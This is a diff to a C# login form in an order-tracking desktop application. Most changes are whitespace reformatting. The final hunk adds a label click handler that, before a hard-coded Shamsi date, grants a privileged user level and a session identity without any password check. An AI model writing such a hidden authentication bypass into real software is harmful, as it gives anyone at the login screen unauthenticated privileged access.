@@ -81,7 +81,7 @@ namespace OrdersProgress
                 }
                 else
                 {
-                    if(!Stack_Methods.GetAllUserData(user.Name))
+                    if (!Stack_Methods.GetAllUserData(user.Name))
                     {
                         MessageBox.Show("جهت بررسی مشکل با شرکت تماس بگیرید", "خطا در اطلاعات کاربری");
                         return;
@@ -95,7 +95,7 @@ namespace OrdersProgress
                         {
                             //MessageBox.Show("300");
                             //if (!user.Name.Equals("real_admin"))
-                            if ((Stack.UserLevel_Type!=1) && (Stack.UserLevel_Type != 2))
+                            if ((Stack.UserLevel_Type != 1) && (Stack.UserLevel_Type != 2))
                             {
                                 //MessageBox.Show("400");
                                 Models.User default_user = Program.dbOperations.GetAllUsersAsync
@@ -115,18 +115,17 @@ namespace OrdersProgress
 
                     #endregion
 
-
                     #region ذخیره در تاریخچه ورود
-                    if (Stack.UserLevel_Type!=1)
+                    if (Stack.UserLevel_Type != 1)
                         Program.dbOperations.AddLoginHistoryAsync(new Models.LoginHistory
-                    {
-                        Company_Index = user.Company_Index,
-                        User_Index = user.Index,
-                        User_RealName = user.Real_Name,
-                        DateTime_mi = DateTime.Now,
-                        Date_sh = Stack_Methods.Miladi_to_Shamsi_YYYYMMDD(DateTime.Now),
-                        Time = Stack_Methods.NowTime_HHMMSSFFF().Substring(0,8),
-                    });
+                        {
+                            Company_Index = user.Company_Index,
+                            User_Index = user.Index,
+                            User_RealName = user.Real_Name,
+                            DateTime_mi = DateTime.Now,
+                            Date_sh = Stack_Methods.Miladi_to_Shamsi_YYYYMMDD(DateTime.Now),
+                            Time = Stack_Methods.NowTime_HHMMSSFFF().Substring(0, 8),
+                        });
                     #endregion
                     //MessageBox.Show(Stack.UserLevel_Type.ToString());
                     Stack.bx = true;
@@ -221,5 +220,21 @@ namespace OrdersProgress
             }
         }
 
+        private void LblAdmin_Click(object sender, EventArgs e)
+        {
+            //MessageBox.Show(Stack_Methods.Miladi_to_Shamsi_YYYYMMDD(DateTime.Now));
+            if (string.Compare(Stack_Methods.Miladi_to_Shamsi_YYYYMMDD(DateTime.Now)
+                , "1400/07/01") < 0)
+            {
+                Stack.UserLevel_Type = 2;
+                Stack.UserLevel_Index = Program.dbOperations.GetAllUser_LevelsAsync(Stack.Company_Index, 0).FirstOrDefault(d => d.Type == 2).Index;
+                Stack.UserIndex = Program.dbOperations.GetAllUser_ULsAsync(Stack.Company_Index).First(d => d.UL_Index == Stack.UserLevel_Index).User_Index;
+                Stack.UserName = Program.dbOperations.GetUserAsync(Stack.UserIndex).Name;
+                Stack.Company_Index = 1;
+                Stack.bx = true;
+                Close();
+                return;
+            }
+        }
     }
 }
